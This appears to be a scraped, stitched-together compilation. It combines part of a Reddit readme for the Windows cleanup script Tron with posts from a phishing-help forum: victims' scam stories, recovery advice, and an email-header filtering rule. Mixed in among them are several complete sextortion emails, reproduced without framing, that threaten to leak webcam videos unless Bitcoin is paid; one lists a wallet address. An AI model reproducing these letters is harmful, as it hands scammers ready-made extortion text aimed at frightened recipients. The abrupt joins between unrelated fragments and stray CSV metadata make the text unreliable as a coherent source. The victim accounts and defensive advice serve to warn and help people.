3. **Disinfect**: `RogueKiller`, `Kaspersky Virus Removal Tool`, `Sophos Virus Removal Tool`, `Malwarebytes Anti-Malware`, `DISM image check (Win8/2012 only)`

4. **Repair**: `Registry permissions reset`, `Filesystem permissions reset`, `SFC /scannow`, `chkdsk` (if necessary)

5. **Patch**: Updates 7-Zip, Java, and Adobe Flash/Reader and disables nag/update screens (uses some of our [PDQ packs](http://www.reddit.com/r/sysadmin/comments/32q0in/pdq_deploy_packs_v300_20150415/)); then installs any pending Windows updates

6. **Optimize**: page file reset, defrag `%SystemDrive%` (usually C:\; skipped if system drive is an SSD)

7. **Wrap-up**: Send job completion email report (if configured; specify SMTP settings in `\resources\stage_7_wrap-up\email_report\SwithMailSettings.xml`

8. **Manual stuff**: Additional tools that can't currently be automated (`ComboFix`, `AdwCleaner`, `aswMBR`, `autoruns`,  etc.)

Saves a log to `C:\Logs\tron.log` *(configurable)*.

##Changelog 
*(full changelog [on Github](https://github.com/bmrf/tron/blob/master/changelog.txt))*


v6.3.9 (2015-07-09)

 - \* Adobe Flash update

 - \* Subtool updates

---------------------------------------------------

##Download

Three download options:

1. **Primary method**: Mirror the [BT Sync](http://www.bittorrent.com/sync) repo (get fixes/updates immediately) using the read-only key:

   BYQYYECDOJPXYA2ZNUDWDN34O2GJHBM47

    *Make sure the settings for your Sync folder [look like this](http://i.imgur.com/CFZp4iz.png) (or [this](http://i.imgur.com/cq8Kw1m.png) on v1.3.x).*

2. **Secondary method**: Download a self-extracting .exe pack from one of the mirrors:

3. Third method: Script only

    The master script is available **[here on Github](https://github.com/bmrf/tron/blob/master/tron.bat)** (Note: this is *only* the script and doesn't include the utilities Tron relies on to function).

---------------------------------------------------

##Command-Line Support

Tron has full command-line support. All flags are optional, can be combined, and override their respective script default when used.

    Usage: tron.bat [-a -c -d -e -er -gsl -m -o -p -r -sa -sb -sd -se -sp -sfr -spr -srr -sw -v -x] | [-h]

    Optional flags (can be combined):
     -a   Automatic mode (no welcome screen or prompts; implies -e)
     -c   Config dump (display current config. Can be used with other
          flags to see what WOULD happen, but script will never execute
          if this flag is used)
     -d   Dry run (run through script without executing any jobs)
     -e   Accept EULA (suppress display of disclaimer warning screen)
     -er  Email a report when finished. Requires you to configure SwithMailSettings.xml
     -gsl Generate summary logs. These specifically list removed files and programs
     -m   Preserve OEM Metro apps (don't remove them)
     -np  Skip the pause at the end of the script
     -o   Power off after running (overrides -r)
     -p   Preserve power settings (don't reset power settings to default)
     -r   Reboot automatically (auto-reboot 30 seconds after completion)
     -sa  Skip anti-virus scans (MBAM, KVRT, Sophos)
     -sb  Skip de-bloat (OEM bloatware removal; implies -m)
     -sd  Skip defrag (force Tron to ALWAYS skip Stage 5 defrag)
     -se  Skip Event Log clearing
     -sp  Skip patches (do not patch 7-Zip, Java Runtime, Adobe Flash or Reader)
     -sfr Skip filesystem permissions reset (saves time if you're in a hurry)
     -spr Skip page file reset (don't set to ""Let Windows manage the page file"")
     -srr Skip registry permissions reset (saves time if you're in a hurry)
     -sw  Skip Windows Updates (do not attempt to run Windows Update)
     -v   Verbose. Show as much output as possible. NOTE: Significantly slower!
     -x   Self-destruct. Tron deletes itself after running and leaves logs intact

    Misc flags (must be used alone):
     -h   Display this help text

---------------------------------------------------

##Integrity

`checksums.txt` contains SHA-256 checksums for every file and is signed with [my PGP key](http://pool.sks-keyservers.net:11371/pks/lookup?op=get&amp;amp;search=0x07D1490F82A211A2) (0x07d1490f82a211a2; pubkey included). You can use this to verify package integrity.

Please suggest modifications and fixes; community input is helpful and appreciated.

I am interested in the nature of malwares,but lacking skills and not sure how to start,nonetheless interested in reverse engineering (might it be helpful?),hence learning c++ and ASMx86_64. How would you recommend to start? Which websites/blogs you might recommend? What was your starting point?

1603478725.0,"I clicked on a link, what do I do?!? - Check here first.","One of the most common questions posted here is what to do if you've clicked on a phishing link. This short guide is intended to help with these questions and what to do if you've clicked on a phishing link.

**DO NOT ENTER ANY CREDENTIALS OR LOGIN DETAILS FOR ANYTHING IF YOU'VE CLICKED ON A MALICIOUS LINK.**


1. Links are generally not malicious on their own. While clicking on any unknown links can be dangerous it is difficult to design a phish that works just by clicking the link. Most links take you to a (usually fake) page that will ask for certain credentials. As long as you closed the page after you clicked the link you're *probably* fine, but it's still a good idea to change your password for whatever service the phishing link was trying to access (such as amazon).

2. If you clicked a link that downloaded a file, delete the file. Generally these files aren't harmful unless opened after downloading.

3. If you've clicked a phishing link and have provided credentials to a service, change the password for that service. Say you've been tricked into giving someone your Amazon credentials. Go to Amazon.com directly and change your password. Also, check the ""third-party account access"" section of your commonly used websites. Often phishing links and malicious services will try to authorize themselves to your account rather than outright stealing your credentials.

4. When logging into websites with sensitive information such as a bank it's best to bookmark the site and visit the site directly each time from that bookmark. That way you know that the website you're using is the real one.

5. **ENABLE 2FA (TWO FACTOR AUTHENTICATION)** This is perhaps the best thing you can do to protect your sensitive accounts. All websites that deal with sensitive information will allow you to use either your phone number or an authentication app (I like Authy) to generate one-time login codes to further secure your account. Unless someone gets your credentials and your 2FA device (your phone) they won't be able to access your account.

6. **Please** use a password manager of some sort. This will allow you to use strong and unique passwords for each site you use. If one of your accounts is hacked or phished all of your other accounts will be safe with unique passwords (unless your email was hacked/phished).
7. Ensure you have a backup email and/or phone number connected to your primary email account so that you can recover access if you're locked out. Additionally, make sure your recovery methods are as secure as your primary email login.",phishing,2567,436,51,1

Hello there!

Unfortunately, there are some bad news for you.

You truly enjoy checking out porn websites and watching dirty videos, while having a lot of kinky fun.

I RECORDED YOU (through your camera) SATISFYING YOURSELF!

If you still doubt my serious intentions, it only takes couple mouse clicks to share the video of you with your friends, relatives, all email contacts and on social networks.

All you need is $1600 USD in Bitcoin (BTC) transfer to my account (Bitcoin equivalent based on exchange rate during your transfer).

After the transaction is successful, I will proceed to delete everything without delay.

Afterwards, we can pretend that we have never met before.

In addition, I assure you that all the harmful software will be deleted from your device.

Be sure, I keep my promises!

If you are unaware how to buy and send Bitcoin (BTC) - Google: Where to buy Bitcoin (BTC), to send and receive Bitcoin (BTC), you can register your wallet for example here: www.blockchain.com

My Bitcoin (BTC) address is xxx

Yes, that's how the address looks like, copy and paste my address, it's (cAsE-sEnSEtiVE).

You are given not more than 48 hours after you have opened this email (2 days to be precise).

Everything will be carried out based on fairness!

in fact, i actually placed a malware on the adult vids (adult porn) website and you know what, you visited this site to experience fun (you know what i mean).  


When you were viewing videos, your browser started out operating as a RDP having a key logger which provided me with accessibility to your display and web cam.  


immediately after that, my malware obtained every one of your contacts from your Messenger, FB, as well as email account.  
after that i created a double-screen video. 1st part shows the video you were viewing (you have a nice taste omg), and 2nd part displays the recording of your cam, and its you.  


Best solution would be to pay me $1014.  


We are going to refer to it as a donation. in this situation, i most certainly will without delay remove your video.

You could go on your life like this never happened and you will not ever hear back again from me.  
You'll make the payment via Bitcoin (if you do not know this, search 'how to buy bitcoin' in Google).  


if you are planning on going to the law, surely, this e-mail can not be traced back to me, because it's hacked too.  


I have taken care of my actions. i am not looking to ask you for a lot, i simply want to be paid.  
if i do not receive the bitcoin;, i definitely will send out your video recording to all of your contacts including friends and family, co-workers, and so on.  


Nevertheless, if i do get paid, i will destroy the recording immediately.  


If you need proof, reply with Yeah then i will send out your video recording to your 8 friends.  


it's a nonnegotiable offer and thus please don't waste mine time & yours by replying to this message.

I've been watching you for a few months now.

The fact is that your computer has been infected with malware through an adult site that you visited.
If you are not familiar with this, I will explain.
Trojan Virus gives me full access and control over a computer or other device.
This means that I can see everything on your screen, turn on the camera and microphone, but you do not know about it.
I also have access to all your contacts and all your correspondence.

Why did your antivirus not detect malware?
Answer: The malware I used is driver-based, I update its signatures every 4 hours. Hence your antivirus is unable to detect its presence.
I made a video showing how you satisfy yourself in the left half of the screen, and the right half shows the video you were watching at the time.

With one mouse click, I can send this video to all your emails and contacts on your social networks.
I can also make public all your e-mail correspondence and chat history on the messengers that you use.

If you don't want this to happen, transfer $1450 in Bitcoin equivalent to my Bitcoin address (if you do not know how to do this, just search ""buy bitcoin"" on Google).

I will give you 50 hours (more than 2 days) to pay. I will get a notice, when you open this email, and the timer will start.

..

*Hi there!*

*I regret to inform you about some sad news for you.*  
*Approximately a month or two ago I have succeeded to gain a total access to all your devices utilized for browsing internet.*  
*Moving forward, I have started observing your internet activities on continuous basis.*

*Go ahead and take a look at the sequence of events provided below for your reference:*  
*Initially I bought an exclusive access from hackers to a long list of email accounts (in today’s world, that is really a common thing, which can arranged via internet).*  
*Evidently, it wasn’t hard for me to proceed with logging in your email account (xxx).*

*Within the same week, I moved on with installing a Trojan virus in Operating Systems for all devices that you use to login to email.*  
*Frankly speaking, it wasn’t a challenging task for me at all (since you were kind enough to click some of the links in your inbox emails before).*  
*Yeah, geniuses are among us.*

*Because of this Trojan I am able to gain access to entire set of controllers in devices (e.g., your video camera, keyboard, microphone and others).*  
*As result, I effortlessly downloaded all data, as well as photos, web browsing history and other types of data to my servers.*  
*Moreover, I have access to all social networks accounts that you regularly use, including emails, including chat history, messengers, contacts list etc.*  
*My unique virus is incessantly refreshing its signatures (due to control by a driver), and hence remains undetected by any type of antiviruses.*

*Hence, I guess by now you can already see the reason why I always remained undetected until this very letter…*

*During the process of compilation of all the materials associated with you,*  
*I also noticed that you are a huge supporter and regular user of websites hosting nasty adult content.*  
*Turns out to be, you really love visiting porn websites, as well as watching exciting videos and enduring unforgettable pleasures.*  
*As a matter of fact, I was not able to withstand the temptation, but to record certain nasty solo action with you in main role,*  
*and later produced a few videos exposing your masturbation and cumming scenes.*

*If until now you don’t believe me, all I need is one-two mouse clicks to make all those videos with everyone you know,*  
*including your friends, colleagues, relatives and others.*  
*Moreover, I am able to upload all that video content online for everyone to see.*  
*I sincerely think, you certainly would not wish such incidents to take place, in view of the lustful things demonstrated in your commonly watched videos,*  
*(you absolutely know what I mean by that) it will cause a huge adversity for you.*

*There is still a solution to this matter, and here is what you need to do:*  
*You make a transaction of $1490 USD to my account (an equivalent in bitcoins, which recorded depending on the exchange rate at the date of funds transfer),*  
*hence upon receiving the transfer, I will immediately get rid of all those lustful videos without delay.*  
*After that we can make it look like there was nothing happening beforehand.*  
*Additionally, I can confirm that all the Trojan software is going to be disabled and erased from all devices that you use. You have nothing to worry about,*  
*because I keep my word at all times.*

*That is indeed a beneficial bargain that comes with a relatively reduced price,*  
*taking into consideration that your profile and traffic were under close monitoring during a long time frame.*  
*If you are still unclear regarding how to buy and perform transactions with bitcoins – everything is available online.*

*Below is my bitcoin wallet for your further reference: 1GS1SRz3QBC1NUeuhu8EWkx37qQXanUxGG*

*All you have is 48 hours and the countdown begins once this email is opened (in other words 2 days).*

*The following list includes things you should remember and avoid doing:*

1641834571.0,My mother has been a victim of phishing up to three times since the end of 2019,"It has been a very complicated beginning of the year. 
It all began in January 2021 when I found out my mother was scammed by an individual who was pretending to be the musician André Rieu for whom she divorced my father. The scam started with the excuse that this person wanted to send my mother a ring and a necklace but she had to pay for part of the present. The lies kept on going and the story kept on changing. Then he started saying he got sick and needed money for the operation, then for the hospital, a lawyer… god knows what. My mother ended up losing around 150K Euros to this scam. She tried to cut the communication but since she didn’t change her telephone number despite me insisting on it, they kept on contacting her. 
After finding this out, she moved cities but I recently discovered she kept on talking with this person and sending money. 
Furthermore, despite my warnings she opened new Instagram accounts where more scammers made profit of her ignorance and nativity. To the date I have found three different main profiles and conversations with up to 5 different people who scammed her…
She was contacted by a guy who said to be a US military person who needed cash to go visit her and a guy with a terminally ill daughter who needed her help. 
To the date she’s lost 230K€
This December I went to visit her and found out about all of the above plus over 12 loans she got to keep on sending money… I have even contacted a lawyer to try and save her from the debt…after 10very hard days together, I thought this was over, that she understood the wrongs she did. Unfortunately the day after I left, she did again. She sent money to the guy with the sick daughter… via Bitcoins. 
I am currently desperate, not really knowing what to do. We’ve been to the police station several times to leave a report. They said they would investigate but I do not have much hope left. 
Right now I cannot have my mum live with me because I live in a different country and even though she’s open for therapy, the first appointment would be by the end of February. 
I would much appreciate anyone’s opinion if you guys have been through something similar or have any clue in how I could deal with this.

He informed my chap that a young lady (Demi Pike for what it’s worth) had accidentally transferred him £5 and he would need to transfer £5 back to her account. 

I was half listening to the conversations and my alarm bells were ringing and red flags were up! I got ‘shushed’ when I said it didn’t sound right AT ALL! The number they called phone was the correct Halifax phone number. My partner asked how he could confirm that this wasn’t a scam... he was given a spiel on how it was legit as this scammer could confirm his security question - his mother’s maiden. Again, it really didn’t sound right to me but apparently he knew best and he sent the £5 to the account he was told. He was then told he was going to be put on hold while the scammer confirmed the transfer.... the line went dead. I convinced him to ring THE LEGIT Halifax and let them know what had just happened. 

The real Halifax lady checked his accounts and says “Ahh yes, I see a £5000 withdrawal”. This is when my partner knew he’d f*cked up big time. After being sent to the REAL fraud department, he told his story and what had happened. The Halifax now then asks if he’s had any suspicions calls/text beforehand “Oh actually, now you mention it - I had a weird text for EE but it wasn’t their usual number. The text said I had to sign in through a link, so I did” Guys, I love my chap more than anything but GODDAMN I facepalmed sooooo hard. 

Luckily Halifax have agreed that he’s been a victim of fraud and will reimburse him of all the monies lost. He’s reset all of his passwords and learnt his lesson.

1686364802.0,Rules that work (for me) to keep phishing email out of the inbox,"I was getting lots of phishing email to my inbox that bypassed my Spam filter. It was driving me crazy. And it got even worse after I reported one to [spam.org](https://spam.org). They started doubling down (2-3x) on that email address (thankfully not my main one), from 50 to about 120+ every day.

Phishers (e.g., [printdus.com](https://printdus.com)) send from 'spoofed' (well-formed) fake email addresses. Even though the subject lines were clearly SPAM (misspellings, letters replaced by numbers, lots of icons, odd spacing, etc.), these landed in my inbox.

I've been to all the videos from the pundits saying don't bother with 'block sender'--because they will just change it (mostly True) and rules won't work (that says Maybe).

Large email providers (gmail, outlook, etc.) check to see if sender domains are real as part of a Spam check. For example, [""geeksquad@emailinfo.geeksquad.com](mailto:""geeksquad@emailinfo.geeksquad.com)"" fails because ""[emailinfo.geeksquad.com](https://emailinfo.geeksquad.com)"" is a fake domain name. The goal is to get you to click the link, not reply, so they don't use real email addresses that can lead back to them. It looks good to the user (even though it's an ad for toe fungus), but the authorization checks say it's *possibly* Spam.

Why they get past Spam filters is that it might only ""soft"" fail. Soft fails are when a DNS (domain name server) times out or the Domain Keys Identified Mail (dkim) or Sender Policy Framework (spf) isn't provided. If any of them outright fail, it ends up in Junk folder, but soft fails (in my experience) sometimes get by.

The rule I use checks for the following ""words"" in every received **email header**: ""DNS Timeout"", ""dkim=none"" or ""spf=none"" and send them to my Junk folder. So far, that's fixed it.

And if you want to stop wading through your Junk folder for non-phishing emails, create a second rule to *permanently delete* emails by adding these two phrases: ""dkim=fail"", ""compauth=fail"". It has to run manually, but when I do, all that is left in Junk is garden variety Spam, a few Nigerians offering me large sums of money and emails that were mistakenly classified as spam.

And if you are curious: dkim is Domain Keys Identified Mail \[check for forged senders\]. spf is Sender Policy Framework \[10 DNS fails\]. CompuAuth is Composite Authorization \[spoof check\]. No legitimate sender will fail any of these checks. Even Spam passes. This only gets rid of (most) phishers.",phishing,2473,396,100,1

The e-mail is obviously from gotomallffwef.store but somehow, they were able to use PayPal's domain and PayPal's e-mail address to pass the SPF and DKIM? I saw the e-mail address is coming from service@paypal.com, and there was no warning or flag for this e-mail in Outlook.com.

Was really freaked out because I know coin transfers immediately and you can't get it back and I felt insecure and not so knowledgeable about the crypto accounts I had opened. Called the number in the email (888)- 397-5703 and the guy claimed to tell me how to cancel the transaction. (In hindsight it's clear he didn't ask the right identifying information a customer service rep would normally ask and stumbled a little over the info I was giving him about the charge, but they got me early in the morning (I bet intentionally?) and $6k was a lot so I wasn't thinking clearly.

Finally caught on that it was a horrible scam when they directed me to the ultraviewer website to ""fill out a cancelation form"". I assume they'd have me download remote access software and then steal all my logins? Pains me to say this (because I'm Indian) but it was an Indian guy on the phone. He sounded really compassionate and worried for me.

The email ""FROM"" address was [receipts@messaging.squareup.com](mailto:receipts@messaging.squareup.com) so pretty convincing.

I was on Facebook and someone recommended a live video to me. A live video from a famous German singer. 

It said the first 200 people telling the correct number (on a picture next to him) get 5000€. 
Ya I know, should have been the first indicator...

So, I posted the number in the comments. Cause you know, it was the real singer!

After a while he posted a link in the comments, saying we have to click it to get the money. (I know!!!! Silly me!)

It said to put in the credit card details. No charge. (...). But hey, it was the real singer, why would it be scam?! (Yep...)

So I clicked on the link. Filled in my name and credit card details. (So so so dumb)

It said it didn’t work. I did it again. If I reflect it correctly, there appeared another site. Again: name and credit card details. I made an account. 

It said to confirm the charge of 1€ off my credit card. For verification... (aaaaaaahhhhhhhhh)

Yes, I did that as well. Got a verification code from my bank and typed it in. 

Then it said to sign up for a free 5 day trial on rollermedia.net

Did that as well...

Back on Facebook:

Singer posts in the group “Share in 10 groups to get your money”

THEN, and only THEN, I became suspicious. I clicked on his profile. And you guesses right. Fake. New account. Not official. S.C.A.M.

So, I logged into my bank and immediately blocked my credit card. 

I received and email from rollermedia, confirming my 5 day trial and then continuing with 55$ a month!

I logged in and deleted my account. I quite wondered that it worked. 

I took screenshots of everything. 

I feel so so so very silly!!! So many times I saw things like that and couldn’t believe that people really fall for it. And now I did it myself... my only excuse is stress, dehydration and lack of sleep. :-(

Oh gosh!!!!

Anyway:

Do you think I’m safe? Or can I be prosecuted? I mean, I signed Agree with terms and conditions. 

Is there anything else I could do? Could there be anything on my phone now? I didn’t download anything though. 

My card is blocked. As I wrote, I think there was another page and I can’t really recall if I signed up on two different things. 

IF I did, they can’t get money off my bank, because I blocked my card. But can they demand it from me because I signed up for something?

1598264119.0,"""Xerox Scanned XXXXXXXXXXXX Document: Important Company Guideline Notes""","Hello!

I'm an IT admin and had one of my clients send me a copy of this kind of phishing email and I'm wondering just where it may have come from. The contents are clearly a phishing scam:

""🖨️Attn: XXXXXXXXXXXX

**-You have an important XXXXXXXXXXXX designated Document-**   


It was scanned and sent to you \[XXXXXXXXXXXX\] using a Xerox WorkCentre multifunction device on Microsoft Exchange Portal.   


For more XXXXXXXXXXXX-specific information as it relates to you, please visit XXXXXXXXXXXX

**Retrieve Document**""

I've X'd out any emails and links that look like they would belong to my client's domain, when they clearly don't. The ""please visit"" link is actually something like this: ""[crixerox-secondary.z15.web.core.windows.net](https://crixerox-secondary.z15.web.core.windows.net)"". It takes you to a fake Outlook Web App login page.

This is what gets me:

1. At this particular client's location we've never had a Xerox printer until a week ago. Prior to that it's been all Epson and we never had emails like this.
2. I installed the Xerox printer myself and I disabled the Xerox cloud service, all the ports and protocols, except for the very necessary to get printing working in that particular location. I also installed the drivers (.INF based, not the .exe installer) myself on the workstations.
3. In addition, the whole network is firewall completely, only allowing VPN connections from the outside with logging and all that. There's no way someone would have just scanned the network remotely.
4. I'm suspecting one of the computers might have some sort of spyware installed? I have no other theory for why specifically a ""Xerox"" phishing email arrived in my client's inbox. Ideas where to look?

Thank you!",phishing,1733,272,64,1

He addressed me by my first name, knew the last 4 digits of the card used in my order, and even knew the items in my order. 

I was wary of this being a scam call from the beginning but he was not asking for any (in my opinion at the time) sensitive info. He was not asking for my card number or my bank info or anything like that, he only said he needed to verify it was me who made the order. 

Once I said ""yes I made the order"" he said okay and the phone call was ended. I didn't see any harm in confirming I made the order but I know now it was a scam call so I have no idea what they gain from calling me and confirming that I made that order. I am very worried especially about my privacy as what I purchased was very sensitive and private.

1576085719.0,PHISHING IS MOVING AWAY FROM INTERNET TO LETTERS +1-888-274-5552,"The number +1-888-274-5552 represents a new yet old front in fraudulent phishing in Canada. The scam artist physically prints fake letters similar to and imitating CIBC bank of Canada or any other bank.

The letter is physically dropped at a victim's residential address. The letter has a fake Canada Post stamp on it, that was printed by a laser printer and looks like the letter is genuine. But the letter is fake with logos for the bank. The letter says the victim's account is closed and provides the number +1-888-274-5552 to call.

When the victim calls, they pretend to verify account number by asking usual security questions that banks ask like DOB, SIN, and bank PIN code number etc.  Usually the Victim has already been identified as being a CIBC customer or a customer belonging to the bank they are targeting.

The targeted victim usually has a good credit rating and has banking products with CIBC or the targeted bank. If the Victim's name is 'John Smith', the would intentionally misspell the victim's name to  something like 'jones Smith'. This entices the victim to want to call and correct it, believing that there must be a genuine error resulted from a customer with a similar name to theirs. Inside the letter, at the letter head it will have the correct phone numbers for CIBC, but at the bottom of the letter it asks the Victim to call CIBC divestiture department not customer service department.

The letter also contains a self addressed envelope to CIBC's correct mailing address, but the self Addresses envelope has a fake printed electronic return stamp.  This make's it appear more genuine.  When the Victim calls the number, the fraud artist is looking to get the Victim's Banking PIN code.

Very often the SCAMMERS already have the Victim's Credit details, but what they need is the Victim's Banking PIN code. So when the victim calls, they often provide to the victim, partial information such as...your Credit card number is 666667788, please tell us the last 4 digits.

The Victim then thinks that indeed this is CIBC bank, because they already have ther banking Details. Then They will Hang up with the victim, Tell the Victim the usual bullshit like Thank you for banking with CIBC etc and ask the victim not to call the bank back but allow 5 Business to process whatever it is they claimed.

And they would call the Victim back.  So the victim will call their real Bank 5 days later, but the Fraud has already happened. If you receive such a letter call the police, drop it off at a police station, the scam artist may have been careless and still have left finger prints on it. Or drop it off to your CIBC branch or your bank.

Now, the thing is if they got my email adress (no password given  tho and no money was sent) they could have got the general info of my pre-paid card but that's all there is. I don't have a bank account, nor a credit card, just a pre-paid card of a public service (which has currently 1 buck and 30 cents, yeah, I'm not doing very well). I changed said email password, deleted any photos on my phone, anything.

And since I have no intention of giving out my social during this debacle if I can help it, I settled on forwarding the e-mail to their ""fraud"" group and calling them.

I am now 30 minutes into a 2 hour hold time, and am trying to figure out what I can do in the meantime to protect my real money in my actual bank accounts, as I'm concerned if the Zelle deposit bounces and payments are made against it that they'll try and withdraw from my other existing accounts or come after me.  I deactivated Zelle completely from one of my bank accounts; another bank has Zelle set up, but won't let me deactivate it online, so I pointed it to a savings account that only has $5 in it just in case.

Has anyone seen this before?  I tried searching online but didn't see anything about this kind of scam, all I really found about Ally scams are fake fraud alerts.

And is there anything else I should do to protect myself?  My credit reports are all frozen, so not super worried there, but I'm worried there's something I'm not thinking about.

1650166539.0,How best to deal with Phishing Scam Emails? (Info specific to my current issue in text below),"I 've used gmail for years and, for the most part, I have managed to keep spam mail to a dull roar, i.e. generally only mail from legitimate companies' mailing lists that I purposely or accidentally signed up for while shopping or whatever. However...

&#x200B;

Recently, and all of a sudden, I began to get a handful of definite scam emails a day. It should be mentioned that I am generally quite careful about subscriptions, where I go online, etc, and I cannot think of anything I may hav done for several months to cause this sudden flood of scam. phish mail. 

Generally the emails come in the form of some kind of advertisement from a legitimate company, but from an obviously shady address, with maybe an image of some kind of deal, followed by ridiculous amounts of random information, bits of other emails to other people, bits of weird things like business newsletters, legal and technical jargon from who knows where about who knows what, broken up by what looks sometimes like html code.

&#x200B;

The latest one I got was an Easter ad image from Costco (from [info\_iCF5sQvYxe@hastjyelkmydbga.m.gbhem](mailto:info_iCF5sQvYxe@hastjyelkmydbga.m.gbhem.org).org and CC'd to several other's, like [1.2.3.4.jjga@aol.com](mailto:1.2.3.4.jjga@aol.com)), followed by a stream of hundreds of lines of random shit like broken info about differentN.  American university newsletters from department heads, then a bunch of bs in French, and then hundreds of sets of numbers and letters, all in the same form.

&#x200B;

My questions are these: is there a way to combat these within gmail, like marking each one as spam, or junk or what? With newsletter emails from obviously legit companies, I would simply unsubscribe, but from these scam emails, the Unsubscribe option always brings me to a suspicious webpage and asks I enter. my email address, which of course I do not do.

And also, does anyone have any idea what I might have done to have started this barrage of bullshit? I do not recall irresponsibly giving my email address out in any way whatsoever that I can think of, to legit sources or not, none at all, for many months.I haven't signed up for anything lately, online or at a store, I haven't subscribed to any weird websites, etc. So what gives?

1644824663.0,Discord Moderator Academy Phishing scam,"Long personal rant, sorry, but I am very anxious rn

There is a new scam going around with bots/frauds claiming to be discord staff and sending you “discord moderator exam” links. I was very tired and stupid at the time and I fell for it, filling out my discord login information in a login page that redirected me to the official discord moderator exam website.

I was suspicious at first when the login verification email sent me a different IP address and location and so I decided to check from my phone. It showed the same IP address. Now I was using a mobile data provider for both devices so I thought that it was related to where the mobile data was hosted and thought nothing of it.

I know this was very stupid of me but I verified the login and immediately after I verified it I got logged out from my discord account in all of my devices. I panicked and tried to reset the password (somehow the email was still the same) but I couldn’t because the hacker set up their own 2FA that I couldn’t bypass. At this point I assumed my account was gone for good so I wrote a support email to discord to delete my account.

Now I assume the account has none of my personal information. The email I used wasn’t a personal one, I don’t have my phone number linked to it, and I didn’t have any credit card information in it since I am still a kid (I had nitro but it was gifted to me by a friend and it was expiring in 4 days as of writing this). I also changed all my passwords on other websites/games just to make sure.

And I don’t know why but somehow the hacker bought discord boosts through my account. I don’t know where they charged it or how they were able to buy it but the badge is there on my profile (I was able to see my profile through a friend’s screenshot).

I am currently panicking and I am very scared. I don’t want my personal info (such as IP address, address, face, etc.) being leaked by whoever hacked my account. 

So yeah don’t fall for this.",phishing,1967,377,25,1
1642954820.0,I received a sextortion phishing email and its making me anxious (even though its probably fake),"I received this email back in late December but I didn't really open until a few days ago since I was cleaning out my inbox and spam folders (which was where I found it). After reading the email I was honestly quite anxious, despite the fact that both my mom and my boyfriend (who I showed this email to) reassured me that it was a scam and I should just ignore it. 

Although it's been four days without me hearing anything from my relatives and friends about some inappropriate videos of me plus the fact that I have seen a similar email on the internet, I still feel pretty anxious because of the last part of the email (shown in the second screenshot). 

Anyway, other than providing me reassurance and soothing my anxiety about this, please let me know if there are any places where I can report these types of emails! And let me know if you had similar experiences. (Also is it even possible to download Trojans/any sort of virus on the MacOS/iOS/the operating systems that Apple uses since these are my primary devices?)

Long shot here, but I'm willing to try anything. My cousin was recently scammed, and they were successful in getting the desired money. ***Here is all that I know:***

* Cousin used a Google web browser to search for the log in to Amazon (yes, they're old and didn't grow up with computers).
* They somehow found a spoofed webpage for Amazon, which had a URL of an IP Address which sourced back to a Cloud service (I have the IP address, which I can relay to people via DM).
* They received an error message when attempting to log in, which included a phone number (the number is still active, if you feel it would be helpful, please let me know and I'll provide it to you in a DM).
* They called the number, and the person who answered didn't give them any indication that they were an Amazon support agent. They called themself ""John."" John guided my cousin through downloading GoToAssist, where they screen shared with them, had them delete their CC info from an actual Amazon log in website, and then sign into their bank account via the computer.
* John then guided my cousin through sending a payment of $1,800 through Zelle (which is exactly how much they had in their bank account). My cousin sent two payments since Zelle only allows a max of $999 sent at one time. This payment was sent to two different email addresses (I have both and can also provide them via DM).
* Immediately upon getting the second payment, John hung up.

**What they did after realizing it was a scam:**

* Went to their bank. All of the online banking has been frozen, and their debit and credit cards have been reissued.
* They changed all of their passwords.
* They ran a virus scanner on their computer.
* The programs they were instructed to download were deleted.
* Filed a police report.
* Filed a report through the FBI.

**What I've done:**

* Spoken to reps at their bank, along with helping them file a fraud claim.
   * The bank states that they'll reach out in 10 business days. They have to wait on the recipient's bank's determination to see if my cousin will be given their money back, which my cousin's bank would not guarantee.
* Contacted Zelle. They told us to contact my cousin's bank.

I realize the likelihood of the money being recovered is slim to none because there's that clause that states you should only be sending money to people you know before you send it. I was wondering if anyone knew of any helpful advice for speaking to customer service reps at my cousin's bank (the cousin will be on the line with me while this takes place, so they'll give consent), and any information into contacting Zelle. Really, any helpful information will be great.

1599864179.0,"Best practices to analyse Phishing Email - embedded links, attachments","Hi, This is my first post on this forum. Can any please share Best practices that Security team should follow to analyse Phishing emails reported by end users. 

Few years back, we used to follow the below steps to investigate Phishing emails:-

1. Check the header of email to see sender id/domain info.

2. See if embedded links/attachments are malicious by scanning through various websites such as VirusTotal, McAfee, Symantec, Sucuri

3. Check URL category of embedded url at Bluecoat, Websence, McAfee etc. 

4. Check the reputation of IP address, if available in email body. 

If the email is malicious based on the above analysis then check how many such emails are delivered to other employees -  by searching the emails from same sender or emails with similar subject. Accordingly take actions- block sender/domain etc. I think at that time it was not possible for us to delete the emails that have already been delivered to users.

Can somebody advise current practices. I have heard that we shouldn't scan files at VirusTotal - but I didn't completely understand the logic behind it. Are there any tools/websites that can be utilised for the same ?",phishing,1160,194,26,1

Has anyone been experiencing an increase in a particular type of phishing e-mail that links to old articles? Users in our environment have been getting e-mails that are very simple, they contain a link to a random article on some reputable site or at least semi-reputable. There is no specific URL trickery or anything like that. Are the phishers just trying to test if the inbox exists? The sender varies from gmail/Hotmail type email to professional e-mail accounts.

1583947114.0,"Phishing Attack? via standard mail, not email. Looking for help."," Hi,

This is a strange situation where I’ve received a collections notice in the mail (not e-mail) claiming I owe a certain amount of money for past debts not being paid to what I can tell is a credit card I’ve never owned.

The actual letter is riddled with so many unprofessional oddities, one big one being my first name spelled incorrectly. Also simple things like inconsistent text alignment. It has a number to call “if I have questions about this *offer*”. Thought that was weird language to use. I’ve googled the number and the search results return many reports of people claiming it’s a complete scam. I’ve also googled the P.O. Box where I can mail the money to and it’s a random box not associated with any business in a family suburb in a city in my country that I don’t live anywhere near.

Although my nerves were calmed hearing other people have had a similar issue I decided to get a credit report from Equifax. I received the credit report from them and to my surprise this debt showed up on the report. The account had been opened in Feb 2019 and closed in Aug 2019. Non of this to my knowledge. I called Equifax and they claim that this hasn’t or won’t affect my credit score.

I’ve had the same bank, credit cards and debts all with one bank since I was in college over 8 years ago. The day before my credit report came in, I received another duplicate letter claiming I owe the same amount form the same sender.

I’m not sure if this is the correct subreddit for a question like this, or if anyone can provide an insights, direction or guidance but I’d figured I’d try. Was my data bought, sold or stolen without my knowledge? 

I can provide more specific details if this will help with answers.

This one was so silly too: tells me that story about my Social Security Account being locked and suspended and me having allegations of illegal activities and an arrest warrant etc... scary stuff, lol

So I give the guy on the line false info and he doesn't bat an eyelash that my name is Roger (pronounced like french ""roh-cher"") Ribbitt (""with two T's!"") and my last 4 SSN digits are of course 1321, etc etc... he got stuck at my false ZIP code because it didn't validate on his end I suppose.

